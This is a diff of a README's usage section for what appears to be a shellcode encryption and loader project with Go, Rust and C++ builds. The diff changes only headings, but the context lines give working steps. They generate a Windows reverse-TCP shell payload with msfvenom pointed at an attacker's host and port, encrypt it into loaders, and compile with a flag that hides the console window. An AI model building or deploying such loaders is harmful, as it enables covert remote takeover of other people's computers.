@@ -32,7 +32,7 @@ This section lists all major frameworks/libraries used to create this project.
 
 <!-- USAGE EXAMPLES -->
 ## Usage
-For Go
+### For Go
 1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f go 
 2. Remove "0x" and new line values
 3. Place the shellcode in the encryptGo.go file
@@ -43,7 +43,7 @@ For Go
 go build -ldflags -H=windowsgui decryptGo.go
 ```
 
-For Rust
+### For Rust
 1. Place the shellcode.bin file to the same directory as with the encryptPython.py
 2. Execute 
 ```
@@ -56,7 +56,7 @@ cargo build --release
 ```
 Note: If you want to use Rust with two loaders, after encrypting the first binary file, edit the encryptPython.py file, to change the output name of the second binary file, as explained in the relevant Python comments. If you want to use only one loader, simply comment out the irrelevant code lines, as these have been noted in different comments in the Rust code.
 
-For C++
+### For C++ (ChatGPT)
 1. Create a WindowsApplication dummy project in Visual Studio 2022
 2. Change debug to release
 3. Choose the proper port.
